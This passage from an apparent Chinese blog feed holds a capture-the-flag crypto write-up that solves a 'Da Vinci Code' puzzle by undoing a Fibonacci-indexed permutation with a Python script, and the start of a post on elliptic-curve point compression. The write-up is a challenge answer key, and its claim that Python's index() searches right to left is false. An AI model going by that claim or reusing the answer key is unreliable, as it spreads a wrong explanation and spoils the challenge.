class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span>=104</p>
<p>......................</p>
<p>我们观察一下等式右边</p>
<p><img data-src="https://i.loli.net/2021/09/05/XWAMqjL3omGgxci.png" alt="v2-4a25cbfaaf963251ff79a6a1be7d4a7e_720w.png" /><br />
 该等式右边中所有的数字均为斐波那契数，神奇吧。而且这不是一个巧合，这个性质不限于上式中的几个，事实上，我们可以写出前 n 项的平方和，依旧有这样的性质。为什么斐波那契数的前 N 项平方和可以写成两个斐波那契数之积呢？<br />
既然这个性质不是巧合，那么其中必定有着更深层的数学本质。解决这个问题，我们从从上述的等式中貌似很难得到结论。我们转换一下思路，平方有何几何意义，显然平方指的是一个正方形的面积，那好，我们依照这个思路，作一个几何图形试试。</p>
<p><img data-src="https://i.loli.net/2021/09/05/HypPhCXr4W8AIbm.jpg" alt="v2-36ea561a5aefcb023ddf5aa89098c352_720w.jpg" /></p>
<p>这下就很容易明白了，比如式中的第一个等式 1<sup>2+1</sup>2=1*2。左边表示两个正方形的面积，右边表示一个长方形的面积，很显然它们表示的是同一区块的面积。再比如最后一个等式，左边表示上图中六个正方形的面积之和，右边表示图中的大长方形的面积，左右两边也是同一个区块。现在似乎明白了等式为什么成立了<br />
我们只要知道当一个斐波那契数为其前 n 项平方之和，我们就可以构造上面的几何图形，而且这样构造的图形中的长方形 (粗黑线为边界) 的边长只能为斐波那契数。</p>
<ol start="3">
<li>左边为相邻两个斐波那契数的平方和，我们发现计算的结果全为斐波那契数</li>
</ol>
<p><img data-src="https://i.loli.net/2021/09/05/GQR7mzPCDurbVad.jpg" alt="v2-2e93fa053d9596118d74736609a96082_720w.jpg" /></p>
<ol start="4">
<li>斐波那契数列与杨辉三角的关系</li>
</ol>
<p>将杨辉三角中的斜向的一列数求和，得到一组新的数，而这一组新的数正好是斐波那契数列</p>
<p><img data-src="https://i.loli.net/2021/09/05/XrmYkglFMOnw9WA.jpg" alt="v2-f367c8eaa7c2b324716f88eb46b30d1c_720w.jpg" /></p>
<ol start="5">
<li>斐波那契数列的整除性与素数生成性</li>
</ol>
<p>每 3 个数有且只有一个被 2 整除，<br />
每 4 个数有且只有一个被 3 整除，<br />
 每 5 个数有且只有一个被 5 整除，<br />
每 6 个数有且只有一个被 8 整除，<br />
 每 7 个数有且只有一个被 13 整除，<br />
每 8 个数有且只有一个被 21 整除，<br />
 每 9 个数有且只有一个被 34 整除，</p>
<p>.... ...<br />
... ....<br />
 生活中斐波那契数列也是很神秘的存在<br />
大到宇宙银河<br />
<img data-src="https://i.loli.net/2021/09/05/roE7QH9qNCSu4Tc.jpg" alt="v2-5951c3331f817b27427d7b68f12207f7_720w.jpg" /><br />
 小到我们的手指<br />
<img data-src="https://i.loli.net/2021/09/05/EGHAszo8XNWBKpU.jpg" alt="v2-bd85d2b44c3c059b1b53cd713f4888bb_720w.jpg" /><br />
 甚至是鹦鹉螺中都存在斐波那契数<br />
<img data-src="https://i.loli.net/2021/09/05/oer4SCpU2t5EBiA.jpg" alt="v2-b1fc486283bf20f4cb978001334ec9b2_720w.jpg" /></p>
<p>总地来说，斐波那契数列代表了神一样的递归思想。并在数论和计算机科学领域中长盛不衰。</p>
<p>参考</p>
<p>[1] O'Connor, John J.; Robertson, Edmund F., Leonardo Pisano Fibonacci//MacTutor History of Mathematics archive</p>
<p>[2] Dr R Knott. &quot;Who was Fibonacci?&quot;. <span class="exturl" data-url="aHR0cDovL01hdGhzLnN1cnJleS5hYy51aw==">Maths.surrey.ac.uk</span>. Retrieved 2010-08-02.</p>
<p>[3] Weisstein, Eric W., &quot;Binet's Fibonacci Number Formula&quot;, MathWorld.</p>
<p>[4] Douady, S; Couder, Y (1996), &quot;Phyllotaxis as a Dynamical Self Organizing Process&quot; (PDF), Journal of Theoretical Biology 178 (178): 255–74, doi:10.1006/jtbi.1996.0026</p>
<p>[5] Jones, Judy; Wilson, William (2006), &quot;Science&quot;, An Incomplete Education, Ballantine Books, p. 544, ISBN 978-0-7394-7582-9</p>
<p>[6] Brousseau, A (1969), &quot;Fibonacci Statistics in Conifers&quot;, Fibonacci Quarterly (7): 525–32</p>
<p>[7] Prusinkiewicz, Przemyslaw; Lindenmayer, Aristid (1990), The Algorithmic Beauty of Plants, Springer-Verlag, pp. 101–7, ISBN 978-0-387-97297-8</p>
<p>[8] Vogel, H (1979), &quot;A better way to construct the sunflower head&quot;, Mathematical Biosciences 44 (44): 179–89, doi:10.1016/0025-5564(79)90080-4</p>
<h2 id="解题思路"><a class="anchor" href="#解题思路">#</a> 解题思路</h2>
<p>现在回到题目</p>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>达芬奇隐藏在蒙娜丽莎中的数字列:</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>1 233 3 2584 1346269 144 5 196418 21 1597 610 377 10946 89 514229 987 8 55 6765 2178309 121393 317811 46368 4181 1 832040 2 28657 75025 34 13 17711</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>记录在达芬奇窗台口的神秘数字串:</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>36968853882116725547342176952286</pre></td></tr></table></figure><p>这道题题目是达芬奇密码，我一开始猜想可能会和原著有关，于是去翻阅里面存在的各种密码</p>
<p><img data-src="https://i.loli.net/2021/09/05/wT6ul4B5S8yxIa7.jpg" alt="微信图片_20210905160715.jpg" /><br />
 不耐心，没找到。<br />
但是<br />
电影简介中会提到 —— 斐波那契数列。贯穿整部电影的重要线索。<br />
而隐藏在蒙娜丽莎中的数字列则是斐波那契数列</p>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>1 1 2 3 5 8 13 21 34 55 89 144 233 377 610 987 1597 2584 4181 6765 10946 17711 28657 46368 75025 121393 196418 317811 514229 832040 1346269 2178309</pre></td></tr></table></figure><p>对比蒙娜丽莎中的数字列，发现数值一样，但是进行了位移。<br />
之后对比，观察题目中给到的两个数列的长度都是 32，并且题目提示 flag 也是 32 位，可以推测，神秘数列是通过 flag 位移后得出的，而位移的规则是斐波那契数列的位移。</p>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>1 1 2 3 5 8 13 21 34 55 89 144 233 377 610 987 1597 2584 4181 6765 10946 17711 28657 46368 75025 121393 196418 317811 514229 832040 1346269 2178309</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>1 233 3 2584 1346269 144 5 196418 21 1597 610 377 10946 89 514229 987 8 55 6765 2178309 121393 317811 46368 4181 1 832040 2 28657 75025 34 13 17711</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>3 6 9 6 8 8 5 3 8 8 2 1 1 6 7 2 5 5 4 7 3 4 2 1 7 6 9 5 2 2 8 6</pre></td></tr></table></figure><p>对比两列数列：</p>
<p>第 0 位 1 还是 1，没有位移。</p>
<p>第一位 233 是斐波那契数列中的第十二位（从第 0 位开始算），因此下面神秘数字串的第一位的 6 是原本 flag 的第十二位。（因为神秘数列是通过 flag 位移后得出的，而位移的规则是斐波那契数列的位移。我们通过斐波那契数列位移反推 flag）</p>
<p>第二位 3 是斐波那契数列的第三位，因此下面神秘数字串的第二位的 9 是原本 flag 的第三位。</p>
<p>以此类推……</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>fb <span class="token operator">=</span> <span class="token string">'1 1 2 3 5 8 13 21 34 55 89 144 233 377 610 987 1597 2584 4181 6765 10946 17711 28657 46368 75025 121393 196418 317811 514229 832040 1346269 2178309'</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>t <span class="token operator">=</span> <span class="token string">'1 233 3 2584 1346269 144 5 196418 21 1597 610 377 10946 89 514229 987 8 55 6765 2178309 121393 317811 46368 4181 1 832040 2 28657 75025 34 13 17711 '</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>m <span class="token operator">=</span> <span class="token string">'36968853882116725547342176952286'</span></pre></td></tr><tr><td data-num="6"></td><td><pre>s <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">32</span></pre></td></tr><tr><td data-num="7"></td><td><pre>s <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>fb <span class="token operator">=</span> fb<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>t <span class="token operator">=</span> t<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    s<span class="token punctuation">[</span>fb<span class="token punctuation">.</span>index<span class="token punctuation">(</span>t<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> m<span class="token punctuation">[</span>i<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>这里补充一下 python 语法：<br />
Python 列表 index () 方法<br />
<mark> index () 方法返回指定值首次出现的位置</mark></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>fruits <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'apple'</span><span class="token punctuation">,</span> <span class="token string">'banana'</span><span class="token punctuation">,</span> <span class="token string">'cherry'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>x <span class="token operator">=</span> fruits<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">"cherry"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>返回为<span class="token number">2</span></pre></td></tr></table></figure><p>最后结果中带有一个 a<br />
<img data-src="https://i.loli.net/2021/09/05/oqzdfx6lneWrhwR.png" alt="微信图片_20210905163820.png" /></p>
<p>题目说的是 32 位十进制，可能是哪里出错了...</p>
<p>注意数字列中的第 2 个 1 在第 24 位，由于 string.index () 函数在查询下标的时候，会从右往左查询，故而第 24 位的 1 所对应的数字 7，覆盖了第 0 个位置的 1 所对应的数字 3。所以第 1 个位置没有数字，还是 a</p>
]]></content>
      <categories>
        <category>Write-up</category>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>斐波那契数列</tag>
      </tags>
  </entry>
  <entry>
    <title>点压缩技术在椭圆曲线上的理论应用</title>
    <url>/crypto/write/%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E7%82%B9%E5%8E%8B%E7%BC%A9/</url>
    <content><![CDATA[<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>椭圆曲线在有限域上存在标准的点压缩技术，使得仅需原本一半的比特数来表示</mtext><mi>E</mi><mi>C</mi><mi>C</mi><mtext>中的点，</mtext><mspace linebreak="newline"></mspace><mtext>在</mtext><msub><mi>F</mi><msup><mn>2</mn><mi>n</mi></msup></msub><mtext>上的椭圆曲线具备更优的性质；在使用点压缩后传输仅需更少的比特或存储时仅需更少的空间</mtext><mspace linebreak="newline"></mspace><mtext>具体应用在内存和带宽受限的情形下如无线网络或智能卡</mtext></mrow><annotation encoding="application/x-tex">椭圆曲线在有限域上存在标准的点压缩技术，使得仅需原本一半的比特数来表示ECC中的点，\\在F_{2^n}上的椭圆曲线具备更优的性质；在使用点压缩后传输仅需更少的比特或存储时仅需更少的空间\\ 具体应用在内存和带宽受限的情形下如无线网络或智能卡
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">椭</span><span class="mord cjk_fallback">圆</span><span class="mord cjk_fallback">曲</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">限</span><span class="mord cjk_fallback">域</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">存</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">标</span><span class="mord cjk_fallback">准</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">点</span><span class="mord cjk_fallback">压</span><span class="mord cjk_fallback">缩</span><span class="mord cjk_fallback">技</span><span class="mord cjk_fallback">术</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">使</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">仅</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">原</span><span class="mord cjk_fallback">本</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">半</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">比</span><span class="mord cjk_fallback">特</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">来</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">示</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">点</span><span class="mord cjk_fallback">，</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">在</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5935428571428571em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">椭</span><span class="mord cjk_fallback">圆</span><span class="mord cjk_fallback">曲</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">具</span><span class="mord cjk_fallback">备</span><span class="mord cjk_fallback">更</span><span class="mord cjk_fallback">优</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">质</span><span class="mord cjk_fallback">；</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">使</span><span class="mord cjk_fallback">用</span><span class="mord cjk_fallback">点</span><span class="mord cjk_fallback">压</span><span class="mord cjk_fallback">缩</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">传</span><span class="mord cjk_fallback">输</span><span class="mord cjk_fallback">仅</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">更</span><span class="mord cjk_fallback">少</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">比</span><span class="mord cjk_fallback">特</span><span class="mord cjk_fallback">或</span><span class="mord cjk_fallback">存</span><span class="mord cjk_fallback">储</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">仅</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">更</span><span class="mord cjk_fallback">少</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">空</span><span class="mord cjk_fallback">间</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">具</span><span class="mord cjk_fallback">体</span><span class="mord cjk_fallback">应</span><span class="mord cjk_fallback">用</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">内</span><span class="mord cjk_fallback">存</span><span class="mord cjk_fallback">和</span><span class="mord cjk_fallback">带</span><span class="mord cjk_fallback">宽</span><span class="mord cjk_fallback">受</span><span class="mord cjk_fallback">限</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">情</span><span class="mord cjk_fallback">形</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">无</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">网</span><span class="mord cjk_fallback">络</span><span class="mord cjk_fallback">或</span><span class="mord cjk_fallback">智</span><span class="mord cjk_fallback">能</span><span class="mord cjk_fallback">卡</span></span></span></span></span></p>
<p><a id="more"></a></p>
<p>​	为了能让压缩后的坐标完全恢复，与原来相比，需要增加一定的计算量。总而言之就是以一定量的运算换取较多的空间资源。</p>
<h2 id="在f_p上的点压缩"><a class="anchor" href="#在f_p上的点压缩">#</a> 在 F_p 上的点压缩</h2>
<p>​	在椭圆曲线密码体制中，需要将 G 点的 x、y 坐标都传送给对方，但是加密信息却只是坐标中的一小部分，存在很大的空间剩余问题，如何合理地分配空间资源，这就让 &quot;点压缩&quot; 技术就此诞生。</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>设加密系统所用基域是</mtext><msub><mi>F</mi><mi>p</mi></msub><mtext>，定义在其之上的椭圆曲线</mtext><mo>:</mo><mspace linebreak="newline"></mspace><mi>E</mi><mo>:</mo><msup><mi>Y</mi><mn>2</mn></msup><mo>=</mo><msup><mi>X</mi><mn>3</mn></msup><mo>+</mo><mi>a</mi><mi>X</mi><mo>+</mo><mi>b</mi><mspace width="1em"/><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo>∈</mo><msub><mi>F</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">设加密系统所用基域是F_p，定义在其之上的椭圆曲线: \\
E:Y^2=X^3+aX+b \quad a,b \in F_p
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord cjk_fallback">设</span><span class="mord cjk_fallback">加</span><span class="mord cjk_fallback">密</span><span class="mord cjk_fallback">系</span><span class="mord cjk_fallback">统</span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">用</span><span class="mord cjk_fallback">基</span><span class="mord cjk_fallback">域</span><span class="mord cjk_fallback">是</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">义</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">其</span><span class="mord cjk_fallback">之</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">椭</span><span class="mord cjk_fallback">圆</span><span class="mord cjk_fallback">曲</span><span class="mord cjk_fallback">线</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>对一个点</mtext><mi>R</mi><mo>=</mo><mtext>（</mtext><msub><mi>x</mi><mi>R</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mi>R</mi></msub><mtext>）</mtext><mo>∈</mo><mi>E</mi><mo stretchy="false">(</mo><msub><mi>F</mi><mi>p</mi></msub><mo stretchy="false">)</mo><mo separator="true">,</mo><mtext>当</mtext><msub><mi>y</mi><mi>R</mi></msub><mo>≡</mo><mn>1</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mn>2</mn><mo stretchy="false">)</mo><mtext>，将</mtext><mi>R</mi><mtext>记为</mtext><mo stretchy="false">[</mo><msub><mi>x</mi><mi>R</mi></msub><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">]</mo><mtext>，否则记为</mtext><mo stretchy="false">[</mo><msub><mi>x</mi><mi>R</mi></msub><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">]</mo><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">对一个点R=（x_R,y_R）\in E(F_p),当y_R \equiv1(mod2)，将R记为[x_R,1]，否则记为[x_R,0].
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">点</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">（</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">）</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">当</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord">2</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">将</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord cjk_fallback">记</span><span class="mord cjk_fallback">为</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">否</span><span class="mord 